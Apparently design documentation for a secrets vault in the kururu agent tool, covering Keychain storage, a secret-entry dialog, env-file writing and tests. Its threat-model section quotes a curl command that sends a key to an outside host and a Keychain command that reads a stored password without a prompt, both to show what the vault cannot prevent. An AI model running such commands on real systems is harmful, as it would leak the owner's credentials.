# The vault: secrets kept, asked for and used without being read

The vault is two things. It is a **census**, Settings → Vault, which names
every key, env file and login kururu can see or lend and never shows a value
([nodes](nodes.md#the-vault-page)). And it is a **store** of its own: values
the owner pastes into a dialog instead of a chat, kept in the Mac's
Keychain, written where a program needs them, and used by commands that
never show them to the model. This file is about the store. The argument,
the threat model and the order it was built in are in
[`plans/vault-secrets.md`](plans/vault-secrets.md).

## What it does and does not protect

It stops **accidents**: a key pasted into a chat and kept in a transcript, a
key an agent printed and the model repeated, a key in a backup, a log or on
a screen. It does **not** contain an agent that means harm, and cannot:

- A command run with a secret can send it anywhere. Masking its output does
  nothing about `curl -d "$KEY" https://elsewhere`.
- An item made by `/usr/bin/security` trusts that tool, so **any process
  running as the owner can read it** with `security find-generic-password
  -s kururu-vault -a <name> -w`, with no prompt. The approval setting governs
  kururu's door, not the Keychain behind it.
- An env file the dialog writes is a plain `0600` file, readable by anything
  running as the owner.

The answer to a misbehaving agent is **narrow, short-lived keys** — staging
rather than production, scoped to one thing, rotated after the job — and
**approval** on the ones that would hurt. Encryption is not that answer, and
nothing here pretends it is.

## Items

An item is a name, a label, a use rule and a value.

- **The name** is lower-case words in up to four `/`-separated parts, project
  first: `pylink/bancard-staging-private`, `deck/sudo`
  (`validItemName`, `shared/vaultitems.ts`).
- **The value** is a generic password in the login Keychain: service
  `kururu-vault`, account the name (`server/src/keychain.ts`). It is written
  with `security -i` reading `add-generic-password … -X <hex>` on its stdin,
  so it is never on a command line; a short printable value is kept as
  itself, anything else as `kururu-b64:` and its base64 in pieces of 1800
  characters (`<name>`, `<name>#1`, …), because one line of `security -i`
  holds about 4 KB and `-w` prints anything unprintable as hex without
  saying so. Every write is read back and compared.
- **The metadata** — label, rule, the env files a value was last written to,
  who asked, when, the last use — is `~/.config/kururu/vault.json`, `0600`,
  never a value. It is on `NEVER_SHARED` (never lent) and off the backup.
- **On Linux** there is no Keychain: values are `0600` files under
  `~/.config/kururu/vault/` (`0700`). `KURURU_VAULT_STORE=file` forces that
  on a Mac, and `KURURU_VAULT_KEYCHAIN=<path>` points the store at another
  keychain file — both for an isolated instance, which must not write the
  owner's Keychain.

## The dialog

Kuru calls `ask_secret`; an agent runs `vault ask`. Either names a title, a
reason and up to eight fields, each with a label, an item name, optionally
an env file and variable, and optionally `use: "ask"`:

```sh
vault ask --title "Bancard staging keys for Pylink" --reason "PYL-14's local checkout reads them" \
  --field "Public key"  --name pylink/bancard-staging-public  --env ~/.config/pylink-local/env:BANCARD_PUBLIC_KEY \
  --field "Private key" --name pylink/bancard-staging-private --env ~/.config/pylink-local/env:BANCARD_PRIVATE_KEY
```

- **Checked before it opens** (`adoptAskRequest`, `envPath`): a bad name, a
  path outside home or in a refused folder is the caller's error, never a
  dialog the owner has to puzzle over.
- **Drawn on every page** of this server — the window and the phone — over
  everything (`web/src/components/VaultAsk.tsx`), sent as `vault-asks` on
  connect and on every change, never to another node's watcher. The first
  Save or Cancel answers; the others close. Unanswered in fifteen minutes it
  closes as cancelled; a CLI that hangs up cancels it. The scrim does not
  close it.
- **The fields** are masked inputs with a Show per field, uncontrolled, read
  once on Save into the one message that carries vault values
  (`vault-answer`), with every autofill hint off. Under each: the Keychain
  item, the env file and variable, and "Ask me before each use".
- **On Save** each field with a value goes to the store, then to its env
  file, then into `vault.json` (`Vault.answer`, `server/src/vaultstore.ts`);
  an empty field is skipped; one that fails does not stop the next. The
  page shows the outcome per field before it closes.
- **The caller hears** `saved`, `skipped`, `cancelled` or `failed: <why>` per
  field, and never a value. `ask_secret` waits up to nine minutes; after that
  it returns the ask's id and `ask_secret ask=<id>` waits again.
- **The phone works**: it reaches this Mac over the tailnet, so a value
  travels inside Tailscale's WireGuard tunnel behind the share token; a
  paste is the operating system's and needs no secure context. A phone on
  another node sees that node's asks only.

### An env file

`server/src/vaultfile.ts` and `shared/envfile.ts`:

- under the home folder, resolved, checked, realpath'd and checked again;
  never under `~/.ssh`, `~/.gnupg`, `~/Library` or kururu's own config and
  state; never through a symlink; its folder made `0700` if missing;
- refused unless every line is blank, a comment or `NAME=value` (with
  `export `, and a quoted value over several lines), so a path mistyped as
  `~/.zshrc` changes nothing;
- copied first to `~/.local/state/kururu/vault/env-backups/` (`0600`, the
  newest five per file), not beside it, where a `.gitignore` might miss it;
- every line that sets the variable replaced where it stands, keeping its
  `export `; a variable not there appended; nothing else changed;
- the value bare when it can be, single-quoted when it has no `'`, otherwise
  double-quoted with `\ " $` and `` ` `` escaped; a value with a line break
  is kept in the Keychain and refused for the file;
- written `0600` beside itself and renamed in.

## `list_secrets` and `vault list`

Every item by name and label, its rule, the env files it was written to and
its last use. Never a value.

## Tests

`server/test/vaultitems.test.ts` drives an ask from open to answer with a
store in memory and a scratch home, and greps everything that left the vault
— what pages were sent, the log, `vault.json`, the caller's answer — for the
values. `server/test/keychain.test.ts` makes a throwaway keychain in a
scratch folder and deletes it after, and never touches the login keychain.
